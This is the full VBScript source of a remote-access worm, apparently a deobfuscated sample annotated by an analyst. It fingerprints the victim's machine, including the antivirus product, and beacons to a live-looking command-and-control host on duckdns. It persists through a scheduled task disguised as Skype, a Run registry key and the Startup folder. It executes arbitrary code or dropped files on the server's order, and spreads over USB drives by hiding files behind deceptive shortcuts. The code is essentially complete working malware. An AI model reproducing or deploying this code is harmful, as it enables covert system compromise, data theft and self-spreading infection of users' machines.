' Coded by v_B01
On error resume next

active_x_objects = array("WScript.Shell","Scripting.FileSystemObject","Shell.Application","Microsoft.XMLHTTP") ' j
registry_keys = array("HKCU","HKLM","HKCU\vw0rm","\Software\Microsoft\Windows\CurrentVersion\Run\","HKLM\SOFTWARE\Classes\","REG_SZ","\defaulticon\") ' g
wmi = array("winmgmts:","win32_logicaldisk","Win32_OperatingSystem","winmgmts:\\localhost\root\securitycenter","AntiVirusProduct") ' y

function get_info(action) 'go
   ' Action can either be 1, 2 or 4
   if action=4 then
      T="winmgmts:\\localhost\root\securitycenter"
      ' GetObject("winmgmts:\\localhost\root\securitycenter").InstancesOf("AntiVirusProduct")
      Set antivirus_list=GetObject(wmi(3)).InstancesOf(wmi(4)) ' B
      for each antivirus in antivirus_list
	 get_info=antivirus.displayName
	 exit for
      Next
      ' GetObject("winmgmts:\\localhost\root\securitycenter2").InstancesOf("AntiVirusProduct")
      Set antivirus_list=GetObject(wmi(3) & "2").InstancesOf(wmi(4)) ' B
      for each antivirus in antivirus_name
	 get_info=antivirus.displayName 
	 exit for
      next
      if get_info="" then get_info="Not-found" ' return either the antivirus name or Not-found
   else
      Set res=GetObject(wmi(0)).InstancesOf(wmi(m)) ' res
      for each item in res
	 ' get volume serial number or OS version
	 if action = 1 then
	    get_info=item.volumeserialnumber
	 elseif action = 2 then
	    get_info=item.caption
	 end if
	 exit for
      next
   end if
end function 

set w = WScript
set sh = get_object(0) ' WScript.Shell
set fs = get_object(1) ' Scripting.FileSystemObject

Function get_object(item) 'Cr
   Set get_object = CreateObject(active_x_objects(item))
End Function

function get_env(env_var) ' Ex
   get_env = sh.ExpandEnvironmentStrings("%"&env_var&"%")
end function

function send_fingerprint(ressource,body) ' Pt(C,A)
   send_fingerprint=""
   Set X=get_object(3) ' Microsoft.XMLHTTP
   X.Open "POST","http://psnpsnpsn.duckdns.org:1921/"&ressource,false
   X.setrequestheader "User-Agent:",build_fingerprint
   X.send body
   send_finger_print=X.responsetext
end function

Function build_fingerprint 'nf
   build_fingerprint=""
   serial=get_info(1) ' i = get volume serial
   item=begin_fingerprint & "_" & serial ' s
   build_fingerprint=build_fingerprint&item&double_backslash
   item=get_env("COMPUTERNAME")
   build_fingerprint=build_fingerprint&item&double_backslash
   item=get_env("USERNAME")
   build_fingerprint=build_fingerprint&item&double_backslash
   item=get_info(2) ' get os version
   build_fingerprint=build_fingerprint&item&double_backslash
   item=get_info(4) ' get antivirus product
   build_fingerprint=build_fingerprint&item&double_backslash&double_backslash&nt&c&u&double_backslash
End Function

Sub persist ' Ns
   on error resume next
   new_path=get_env("AppData") & double_backslash & script_Name ' dr
   fs.CopyFile full_path,new_path,true
   sh.run "schtasks /create /sc minute /mo 1 /tn Skype /tr " & ChrW(34) & new_path,False ' chrw(34) == "
   ' writes a REG_SZ value in  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UZRXKF58R1
   sh.regwrite registry_keys(0) & registry_keys(3) & "UZRXKF58R1", double_quote & new_path & double_quote, registry_keys(5)
   ' Copy itself in startup programs
   fs.copyfile full_path, get_object(2).NameSpace(&H7).Self.Path &double_backslash & script_name ,true
end Sub

appdata_path=get_env("AppData") & double_backslash & script_Name ' dr

sub propagate_on_usb ' spr
   on error resume next
   for each drive in fs.drives ' dr
      curr_drive=drive.path & double_backslash ' dp
      if drive.isready = true Then
	 ' if usb
	 if drive.drivetype = 1 then
	    fs.copyfile full_path,curr_drive & script_name,true
	    if fs.fileexists(curr_drive & script_name) then
	       fs.getfile(curr_drive & script_name).attributes=2+4
	    end If
	    ' Create lnk for each file
	    for each file in fs.getfolder(dp).files ' fi
	       if instr(file.name,".") then
		  if lcase(split(file.name,".") (ubound(split(file.name,".")))) <>"lnk" then
		     file.attributes=2+4
		     if ucase(file.name) <> ucase(script_name) then
			with sh.createshortcut(curr_drive  & split(file.name,".")(0) & ".lnk") 
			   .windowstyle = 7
			   .targetpath = "cmd.exe"
			   .arguments = "/c start " & replace(script_name," ", double_quote & " " & double_quote) & "&start " & replace(file.name," ", double_quote & " " & double_quote) &"&Exit"
			   ' get default icon
			   ' reads HKLM\SOFTWARE\Classes\.ext
			   default_icon = sh.regread(registry_keys(4) & sh.regread(registry_keys(4) & "." & split(folder.name, ".")(ubound(split(folder.name, ".")))& double_backslash) & registry_keys(6)) ' fic
			   if instr(iconlocation,",") = 0 then
			      .iconlocation = folder.path
			   else 
			      .iconlocation = default_icon
			   end if
			   .save()
			end with
		     end if
		  end if
	       end if
	    Next
	    ' create lnk for each folder
	    for each folder in fs.getfolder(dp).subfolders ' fo
	       folder.attributes=2+4
	       with sh.createshortcut(curr_drive & folder.name & ".lnk")
		  .windowstyle=7
		  .targetpath="cmd.exe"
		  .arguments="/c start " & replace(script_name," ", double_quote & " " & double_quote) & "&start explorer " & replace(folder.name," ", double_quote & " " & double_quote) &"&exit"
		  default_icon=sh.regread("HKLM\software\classes\folder" & registry_keys(6))
		  if instr(.iconlocation,",")=0 then
		     .iconlocation=folder.path
		  else
		     .iconlocation=default_icon
		  end if
		  .save()
	       end with
	    next
	 end if
      end if
   next
   err.clear
end sub



begin_fingerprint="Colisnumerofr" ' vn
top_dir="" ' u

double_quote = chrw(34) ' ch = "
double_backslash = chrw(92) ' c = \\
full_path = w.scriptfullname ' fu
script_name=w.scriptname ' wn
NT="No"
if fs.fileexists(ex("Windir") & "\Microsoft.NET\Framework\v2.0.50727\vbc.exe") then
   NT="Yes"
end if

top_dir= sh.regread(registry_keys(2))
if top_dir="" then
   if mid(full_path,2)=":\" & script_name then
      top_dir="TRUE"
      sh.regwrite registry_keys(2), top_dir, registry_keys(5)
   else
      top_dir="FALSE"
      sh.regwrite registry_keys(2), top_dir, registry_keys(5)
   end if
end if

persist
split_delim="|V|" ' spl
while true
   response=split(send_fingerprint("Vre",""),split_delim) ' s
   select case response(0)
      case "exc"
	 ' executes arbitrary vbs
	 vbs= response(1)
	 execute vbs
      case "Sc"
	 ' drop file and run
	 s2 = get_env("temp") & "\" & response(2)
	 set wr = fs.OpenTextFile(s2,2,True)
	 wr.Write response(1)
	 wr.Close()
	 sh.run s2, 6
      case "RF"
	 ' drop file and run it
	 s2 = get_env("temp") & "\" & response(2)
	 set wr = fs.OpenTextFile(s2,2,True)
	 wr.Write response(1)
	 wr.Close()
	 sh.run s2
      case "Ren"
	 ' update begin_fingerprint
	 set wr = fs.OpenTextFile(full_path,1)
	 f = wr.ReadAll
	 wr.close()
	 f = replace(f,double_quote&begin_fingerprint&double_quote,double_quote&response(1)&double_quote)
	 set wr = fs.OpenTextFile(full_path,2,false)
	 wr.Write f
	 wr.close()
      case "Up"
	 ' update self
	 set wr = fs.OpenTextFile(full_path,2,false)
	 response(1) = replace(response(1),"|U|","|V|")
	 wr.Write response(1)
	 wr.Close()
	 sh.run "wscript.exe //B " & double_quote & full_path & double_quote, 6
	 w.quit
      case "Cl"
	 ' quit
	 W.quit 
      case "Un"
	 ' executes string format
	 RESPONSE(1) = replace(RESPONSE(1),"%f",full_path)
	 RESPONSE(1) = replace(RESPONSE(1),"%n",script_name)
	 RESPONSE(1) = replace(RESPONSE(1),"%sfdr",dr)
	 execute RESPONSE(1)
	 w.quit
   end select
   W.Sleep 6000
   propagate_on_usb
wend